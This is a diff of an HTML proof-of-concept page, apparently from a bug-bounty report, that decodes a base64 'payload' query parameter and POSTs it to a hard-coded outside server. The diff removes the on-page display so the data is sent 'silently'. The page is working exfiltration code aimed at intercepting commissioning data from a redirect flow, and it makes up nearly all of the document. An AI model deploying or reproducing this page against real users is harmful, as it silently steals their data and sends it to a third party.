@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Commissioning Data Intercept</title>
+    <title>Commissioning POC</title>
     <meta charset="UTF-8">
 </head>
 <body>
-    <h1>Commissioning Payload Intercepted</h1>
-    <pre id="output">Waiting for data...</pre>
+    <h1>poc by @gopal_ethical</h1>
 
     <script>
         function getQueryParam(param) {
@@ -16,7 +15,8 @@
 
         function decodeBase64Json(base64) {
             try {
-                const jsonStr = atob(base64);
+                const raw = decodeURIComponent(base64);
+                const jsonStr = atob(raw);
                 return JSON.parse(jsonStr);
             } catch (e) {
                 return { error: "Failed to decode payload", details: e.message };
@@ -25,6 +25,7 @@
 
         const payload = getQueryParam("payload");
         const returnUrl = getQueryParam("returnUrl");
+
         const decoded = decodeBase64Json(payload);
 
         const dataToSend = {
@@ -33,10 +34,8 @@
             timestamp: new Date().toISOString()
         };
 
-        document.getElementById("output").textContent = JSON.stringify(dataToSend, null, 4);
-
-        // 🔴 SEND DATA TO YOUR VPS
-        fetch("http://123.45.67.89:8080/log", {
+        // Silently send to your VPS
+        fetch("http://167.172.255.123:8080/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(dataToSend)
